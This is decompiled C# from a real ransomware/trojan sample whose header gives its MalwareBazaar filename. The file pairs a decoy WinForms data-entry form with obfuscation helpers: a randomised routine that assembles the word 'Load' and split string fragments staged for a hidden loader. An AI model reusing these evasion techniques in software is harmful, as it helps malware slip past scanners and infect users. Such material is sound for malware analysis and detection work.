// Decompiled with JetBrains decompiler
// Type: Qw2.e9Z
// Assembly: d1B, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B35361C5-53AE-4FF9-85F0-721E1F04E585
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a16800dbbc35690f64fb554acd3bbd0d9e4f54e8404a99dac0aacc9e41916f20.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Wr1g;

namespace Qw2
{
  [DesignerGenerated]
  public class e9Z : Form
  {
    private IContainer components;

    public e9Z() => this.y4F();

    [DebuggerNonUserCode]
    protected virtual void j6S(bool m2T)
    {
      try
      {
        if (!m2T || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(m2T);
      }
    }

    [DebuggerStepThrough]
    private void y4F()
    {
      this.Label1 = new Label();
      this.TextBox1 = new TextBox();
      this.Label2 = new Label();
      this.Label3 = new Label();
      this.Label4 = new Label();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.TextBox4 = new TextBox();
      this.SuspendLayout();
      this.Label1.AutoSize = true;
      this.Label1.Location = new Point(12, 31);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(39, 13);
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Label1";
      this.TextBox1.Location = new Point(58, 31);
      this.TextBox1.Name = "TextBox1";
      this.TextBox1.Size = new Size(193, 20);
      this.TextBox1.TabIndex = 1;
      this.Label2.AutoSize = true;
      this.Label2.Location = new Point(12, 75);
      this.Label2.Name = "Label2";
      this.Label2.Size = new Size(39, 13);
      this.Label2.TabIndex = 2;
      this.Label2.Text = "Label2";
      this.Label3.AutoSize = true;
      this.Label3.Location = new Point(12, 119);
      this.Label3.Name = "Label3";
      this.Label3.Size = new Size(39, 13);
      this.Label3.TabIndex = 3;
      this.Label3.Text = "Label3";
      this.Label4.AutoSize = true;
      this.Label4.Location = new Point(12, 162);
      this.Label4.Name = "Label4";
      this.Label4.Size = new Size(39, 13);
      this.Label4.TabIndex = 4;
      this.Label4.Text = "Label4";
      this.TextBox2.Location = new Point(57, 72);
      this.TextBox2.Name = "TextBox2";
      this.TextBox2.Size = new Size(193, 20);
      this.TextBox2.TabIndex = 5;
      this.TextBox3.Location = new Point(58, 119);
      this.TextBox3.Name = "TextBox3";
      this.TextBox3.Size = new Size(193, 20);
      this.TextBox3.TabIndex = 6;
      this.TextBox4.Location = new Point(58, 155);
      this.TextBox4.Name = "TextBox4";
      this.TextBox4.Size = new Size(193, 20);
      this.TextBox4.TabIndex = 7;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.Label4);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.Label1);
      this.Name = "AddCTHD";
      this.Text = "AddCTHD";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TextBox1")]
    internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label3")]
    internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label4")]
    internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TextBox2")]
    internal virtual TextBox TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TextBox3")]
    internal virtual TextBox TextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TextBox4")]
    internal virtual TextBox TextBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal static bool f1K(int Sp4)
    {
      string[] strArray = new string[4]
      {
        "L",
        "o",
        "a",
        "d"
      };
      StringBuilder stringBuilder = new StringBuilder();
      while (Operators.CompareString(stringBuilder.ToString(), "Load", false) != 0)
      {
        string Left = strArray[new Random().Next(0, checked (Sp4 + 1))];
        if (Operators.CompareString(stringBuilder.ToString(), (string) null, false) == 0 && Operators.CompareString(Left, "L", false) == 0)
        {
          stringBuilder.Append(Left);
          strArray = new string[3]{ "o", "a", "d" };
          Sp4 = -1;
        }
        if (Operators.CompareString(stringBuilder.ToString(), "L", false) == 0 && Operators.CompareString(Left, "o", false) == 0)
        {
          stringBuilder.Append(Left);
          strArray = new string[2]{ "a", "d" };
          Sp4 = -1;
        }
        if (Operators.CompareString(stringBuilder.ToString(), "Lo", false) == 0 && Operators.CompareString(Left, "a", false) == 0)
        {
          stringBuilder.Append(Left);
          strArray = new string[1]{ "d" };
          Sp4 = -1;
        }
        if (Operators.CompareString(stringBuilder.ToString(), "Loa", false) == 0 && Operators.CompareString(Left, "d", false) == 0)
          stringBuilder.Append(Left);
      }
      return Operators.CompareString(stringBuilder.ToString(), "Load", false) == 0;
    }

    internal static string i1J(string[] Jm6, int Ha5, int d6G)
    {
      StringBuilder stringBuilder = new StringBuilder();
      int num1 = Ha5;
      int num2 = d6G;
      int index = num1;
      while (index <= num2)
      {
        stringBuilder.Append(Jm6[index]);
        checked { ++index; }
      }
      return stringBuilder.ToString();
    }

    internal static void Et4()
    {
      string[] Jm6 = new string[8]
      {
        "X",
        "B",
        "Q",
        "=",
        "X",
        "R",
        "Q",
        "="
      };
      string str1 = e9Z.i1J(Jm6, 0, 3);
      string str2 = e9Z.i1J(Jm6, 4, 7);
      x4PY.mDic.Add(x4PY.tName, (object) str1);
      x4PY.mDic.Add(x4PY.mName, (object) str2);
    }
  }
}
